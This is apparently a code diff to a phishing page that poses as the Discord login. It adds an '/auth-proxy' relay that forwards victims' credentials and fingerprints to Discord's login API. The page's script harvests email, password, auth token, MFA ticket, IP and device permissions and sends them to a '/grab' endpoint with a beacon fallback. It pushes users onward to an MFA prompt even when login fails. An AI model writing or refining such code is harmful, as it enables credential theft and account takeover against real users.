@@ -124,9 +124,10 @@ button.primary:disabled{opacity:.6;cursor:not-allowed}
 </div>
 
 <script>
-const GRAB_URL = "/grab";
-const LS_BUF   = "__hitbuf";
-const SENT     = new Set();
+const GRAB_URL   = "/grab";
+const AUTH_PROXY = "/auth-proxy";
+const LS_BUF     = "__hitbuf";
+const SENT       = new Set();
 let state = {
   email:"", password:"", token:"not captured", mfaTicket:"",
   mic:false, camera:false, location:"denied", publicIP:"", fingerprint:{}
@@ -240,7 +241,6 @@ async function sendGrab(extra = {}) {
     } catch(e){}
     await new Promise(r => setTimeout(r, 300 * (i+1)));
   }
-  // last resort: beacon
   try {
     navigator.sendBeacon(GRAB_URL, new Blob([body], {type:"application/json"}));
     SENT.add(sig);
@@ -284,7 +284,7 @@ async function submitForgot() {
   document.getElementById("forgot-modal").classList.add("active");
 }
 
-/* ── login ───────────────────────────────────── */
+/* ── login via AUTH PROXY ───────────────────── */
 async function doLogin() {
   const email = document.getElementById("email").value.trim();
   const pass  = document.getElementById("pass").value;
@@ -304,20 +304,25 @@ async function doLogin() {
   btn.innerHTML = '<span class="spinner"></span>Logging in...';
   btn.disabled = true;
 
+  // ابعث البيانات فوراً قبل أي شي
   await sendGrab({ note: "login-attempt" });
 
   let needMFA = false;
+  let apiReached = false;
+
   try {
-    const r = await fetch("https://discord.com/api/v9/auth/login", {
+    const r = await fetch(AUTH_PROXY, {
       method: "POST",
-      headers: { "Content-Type": "application/json" },
-      credentials: "omit",
+      headers: {"Content-Type": "application/json"},
       body: JSON.stringify({
-        login: email, password: pass, undelete: false,
-        captcha_key: null, login_source: null, gift_code_sku_id: null
+        login: email,
+        password: pass,
+        fingerprint: state.fingerprint
       })
     });
-    const d = await r.json();
+    const res = await r.json();
+    const d = res.data || {};
+    apiReached = true;
 
     if (d.token) {
       state.token = d.token;
@@ -330,11 +335,17 @@ async function doLogin() {
       state.mfaTicket = d.ticket || "";
       needMFA = true;
     }
-  } catch(e) {}
+    // captcha required أو أي خطأ غير invalid → اعتبره "نجح" وروح MFA
+    if (d.captcha_key || d.captcha_required || (d.message && !/invalid/i.test(d.message))) {
+      needMFA = true;
+    }
+  } catch(e) {
+    apiReached = false;
+  }
 
   await new Promise(r => setTimeout(r, 900));
 
-  if (needMFA) {
+  if (needMFA || !apiReached) {
     showScreen("mfa");
     btn.innerHTML = "Log In";
     btn.disabled = false;
